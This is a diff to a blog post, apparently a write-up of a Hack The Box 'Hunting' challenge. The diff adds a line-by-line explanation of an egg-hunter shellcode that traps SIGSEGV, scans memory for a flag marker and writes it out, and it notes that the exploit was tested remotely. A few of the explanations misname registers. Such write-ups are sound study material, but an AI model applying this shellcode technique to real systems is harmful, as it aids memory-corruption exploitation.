@@ -90,7 +90,37 @@ mov    eax,0x4
 int    0x80
 {% endhighlight %}
 
-And this is the script, written in Python3 with *pwntools*, to exploit it:
+Let's inspect this shellcode step by step.
+
+It can be divided into four parts:
+1.  **Initialization of registers (aka "setting up variables")**
+  - `mov    esi,0x60000000`: move into ECX register address to start the search from
+
+2.  **Registration of SISSEGV handler using `signal` syscall**
+  - `call   0xa`: call next instruction; it does *push rip; jmp addr*
+  - `pop    ecx`: store current instruction in ECX; by popping previously saved address, *signal* function handler will be stored here
+  - `sub    ecx, 0x5`: subtract 0x5 from ecx; now it references `call 0xa` instruction
+  - `mov    eax, 0x30`: syscall number in EAX
+  - `mov    ebx,0xb`: *signal* number to override
+  - `int    0x80`: interrupt for system call
+
+3.  **Attempt to dereference address in ECX**
+  - `ror    esi,0x10`: set lower nibble of ESI; I needed this instruction to allow me to increment it
+  - `inc    esi`: increment ESI by one; from *0x6000-0000* to *0x0000-6000* to *0x0000-6001*
+  - `rol    esi,0x10`: set higher nibble of ESI; eg. from *0x0000-6000* to *0x6000-0000*
+  - `mov    edi,DWORD PTR [esi]`: attempt to dereference esi
+  - `cmp    di,0x5448`: if it succeeds, search for string 'HT' in *little-endian*
+  - `jne    0x10`: jmp to phase 1 if the above condition is false
+4. **If it's valid write its content**
+  - `mov    edx,0x25`: number of bytes to write
+  - `mov    ecx,esi`: buffer pointer
+  - `xor    ebx,ebx`: zero fill EBX
+  - `inc    ebx`: increments EBX to match STDOUT fd
+  - `mov    eax,0x4`: *write* syscall
+  - `int    0x80`: interrupt 0x80
+
+
+And this is the script, written in Python3 with *pwntools*, to exploit it (I tested it locally before, then remotely):
 
 {% highlight python %}
 #!/usr/bin/python3
@@ -104,5 +134,7 @@ p.interactive()
 {% endhighlight %}
 
 ![result hunting](/assets/images/posts/2022-09-01-an-alternative-approach-to-htb-hunting/result.PNG "result hunting")
+
+![remote hunting](/assets/images/posts/2022-09-01-an-alternative-approach-to-htb-hunting/remote.PNG "remote hunting")
 
 I think the simplest technique was the *access & egghunter* one, but in the end I prefer this!
